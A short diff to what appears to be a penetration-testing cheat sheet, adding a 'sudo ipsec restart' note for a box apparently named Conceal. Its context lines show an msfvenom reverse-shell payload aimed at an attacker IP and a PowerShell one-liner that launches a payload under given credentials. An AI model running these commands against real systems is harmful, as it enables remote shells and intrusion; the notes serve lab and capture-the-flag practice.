@@ -312,3 +312,9 @@ msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listen
 REM change user, password and payload
 powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
 ```
+
+Used in ```Conceal```
+
+```
+sudo ipsec restart
+```
